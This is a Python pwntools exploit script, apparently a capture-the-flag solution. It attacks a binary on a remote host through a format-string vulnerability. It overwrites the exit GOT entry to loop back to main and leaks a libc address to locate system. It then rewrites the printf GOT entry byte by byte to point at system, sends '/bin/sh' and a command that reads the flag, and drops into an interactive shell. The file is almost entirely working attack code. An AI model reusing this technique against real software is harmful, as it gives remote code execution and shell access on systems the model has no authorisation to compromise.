#!/usr/bin/python3

from pwn import *
import sys

# change those
BINARY = './F'
LIBC = './libc-2.27.so'
HOST = '140.110.112.77'
PORT = 4004

context.binary = BINARY
e = ELF( BINARY )
libc = ''
libc = ELF( LIBC )

if len(sys.argv) > 1:
    r = remote( HOST, PORT )
else: 
    r = process( BINARY, env={"LD_PRELOAD": LIBC} )

# exit -> main
pl = fmtstr_payload(6, {e.got['exit']: 0x4011b3}, write_size='byte')
r.sendline(pl)

r.sendline("%9$p")
r.recvuntil('@@')
addr = int(r.recv()[2:], 16)
libc_base = addr - libc.symbols['_IO_2_1_stderr_']
system_addr = libc_base + libc.symbols['system']
log.info(f'libc_base: {hex(libc_base)}')
log.info(f'system_addr: {hex(system_addr)}')
w = system_addr & 0xffffff
calc = 0
w1 = w & 0xff
calc += w1

w >>= 8

w2 = w & 0xff
if calc > w2:
    w2 = (256 - (calc-w2))
else:
    w2 -= calc
calc += w2
calc &= 0xff
w >>= 8

w3 = w & 0xff
if calc > w3:
    w3 = (256 - (calc-w3))
else:
    w3 -= calc
calc += w3
calc &= 0xff
w >>= 8

t = e.got['printf']

pl = (('%{}c%11$hhn%{}c%12$hhn%{}c%13$hhn'.format(str(w1), str(w2), str(w3)).ljust(0x28, 'A')).encode()+p64(t)+p64(t+1)+p64(t+2))
print(pl)
print(len(pl))
r.sendline(pl)
r.sendline('/bin/sh')
r.sendline('cat /home/`whoami`/flag')
r.interactive()
